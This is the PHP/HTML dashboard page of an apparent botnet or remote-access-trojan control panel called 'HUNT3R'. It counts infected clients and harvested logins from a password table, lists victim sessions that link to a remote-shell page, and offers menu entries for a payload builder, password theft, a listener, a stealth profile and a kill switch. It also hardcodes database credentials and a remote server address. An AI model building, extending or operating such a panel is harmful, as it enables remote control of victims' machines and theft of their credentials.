<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/styles.css">   
    <link rel="stylesheet" href="/css/log_styles.css">
    <link rel="stylesheet" href="/css/shell_styles.css">
    <link rel="stylesheet" href="/css/builder_styles.css"> 
    <link rel="stylesheet" href="/css/xpass_styles.css">
    <link rel="stylesheet" href="/css/xtime_styles.css">
    <link rel="stylesheet" href="/css/xlisten_styles.css">
    <title>HUNT3R</title>
</head>


<body>
    <div class="header">
        <div class="combined-header">
            <div class="horizontal-header">
                <div class="logo">
                    <img src="logo.png" alt="Logo">
                </div>
                <div class="header-content">
		    <div class="online-count">
            	        <?php
			    $pdo = new PDO('mysql:host=85.215.173.82;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Targets:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            	        <?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Infected:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients WHERE status = "Online"');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Clients Online:</font></p>';
        		    echo '<div class="count ';
      			    if ($onlineCount == 0) {
       		  	        echo 'red';
      		     	    } elseif ($onlineCount <= 3) {
       		    		echo 'yellow';
       		  	    } else {
         	   		 echo 'green';
        	  	    }
        	 	    echo '">' . $onlineCount . '</div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Active Sessions:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
		    <div class="online-count">
            		<?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
	            	    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xpwd');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Logins Found:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=team', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Team Member:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $onlineCount . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member WHERE zstatus = "online"');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Member Online:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
                </div>
                <div class="settings-button">
                    <button><img src="/pic/messages.png" alt="Settings" width="40" height="40"></button>
                </div>
		<div class="settings-button">
                    <button><img src="/pic/logout.png" alt="Logout" width="35" height="35"></button>
                </div>
                <div class="settings-button">
                    <button><img src="/pic/settings.png" alt="Settings" width="40" height="40"></button>
                </div>
            </div>
            <div class="vertical-header">
                <div class="menu">
    		    <ul>
        	    <li><div class="menu-item-box"><span class="menu-item-text">CONTROL</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XBUILD</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XFILE</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XPASS</span></div></li>
        	    <li><div class="menu-item-box"><span class="menu-item-text">XSHELL</span></div></li>
        	    <li><div class="menu-item-box"><span class="menu-item-text">XLOGS</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XTIME</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XLISTEN</span></div></li>
       		    <li><div class="menu-item-box"><span class="menu-item-text">XSTATS</span></div></li>
    		    </ul>
	        </div>
                <div class="tabs">
    		    <p><font color="#ffffff"><b>SESSIONS:</b></font></p><br>
    		    <?php
    			$pdo = new PDO('mysql:host=localhost;dbname=session', 'hunt3r', 'hunt3r');
    			$stmt = $pdo->query('SELECT sessionname, sessionstatus, xid FROM xsession');

    			while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        			$sessionName = $row['sessionname'];
        			$sessionStatus = $row['sessionstatus'];
        			$xid = $row['xid'];

        			if ($sessionStatus == 0) {
        			    $color = '#ff0000'; // Rot
        			} elseif ($sessionStatus == 1) {
        			    $color = '#ffff00'; // Gelb
        			} elseif ($sessionStatus == 2) {
        			    $color = '#00ff00'; // Grün
        			} else {
        			    $color = '#ffffff'; // Standardfarbe
        			}

        			echo '<p class="session"><font color="' . $color . '"><b>[-] <a href="yshell.php?sid=' . $xid . '">' . $sessionName . '</a></b></font></p><br>';
    			}
    		    ?>
		</div>
	        <div class="slider-container">
                    <form id="profileForm">
            	            <div class="profile-buttons">
                                <button type="button" class="profile-button active" data-profile="Profil 1">WORK</button>
                                <button type="button" class="profile-button" data-profile="Profil 2">CONTROL</button>
                                <button type="button" class="profile-button" data-profile="Profil 3">STEALTH</button>
                            </div>
                    	</form>
                    </div>
                    <div class="version">
		    	<p>Version 1.0</p><br>
			<button class="kill-switch" id="killSwitchButton">
    			    Kill Switch
    			    <div class="progress-bar"></div>
			</button>
                    </div>
            	</div>
            </div>
    	</div>
    </div>
    <div class="main-content" id="main-content">
	<!-- DYNAMIC MAIN CONTENT IS LOADING HERE -->
    </div>
    <div class="popup-overlay" id="popupOverlay">
    	<div class="popup">
            <p>Möchten Sie das Client-Profil wirklich löschen?</p>
            <button id="confirmDeleteButton">Delete Client Profile</button>
            <button id="cancelDeleteButton">Cancel Delete</button>
            <input type="hidden" id="clientIdToDelete" value="">
    	</div>
    </div>
    <div class="popup-container" id="popupContainer">
        <div class="popup-kill-switch">
            <button class="close-button" onclick="closePopup()">X</button>
            <div class="buttons-container">
            	<button class="cancel-button">Cancel Kill Switch</button>
            	<button class="kill-now-button">KILL NOW</button>
            </div>
            <div class="timer">30</div>
    	</div>
    </div>
    <script type="text/javascript" src="/js/script.js" defer></script>
    <script type="text/javascript" src="/js/widgets.js" defer></script>
    <script type="text/javascript" src="/js/client_interval.js" defer></script>
    <script type="text/javascript" src="/js/logs.js" defer></script>
    <script type="text/javascript" src="/js/right_pane.js" defer></script>
    <script type="text/javascript" src="/js/kill_switch.js" defer></script>
    <script type="text/javascript" src="/js/builder_popup.js" defer></script>
    <script type="text/javascript" src="/js/xpass.js" defer></script>
    <script type="text/javascript" src="/js/xfile.js" defer></script>
    <script type="text/javascript" src="/js/xlisten.js" defer></script>
</body>
</html>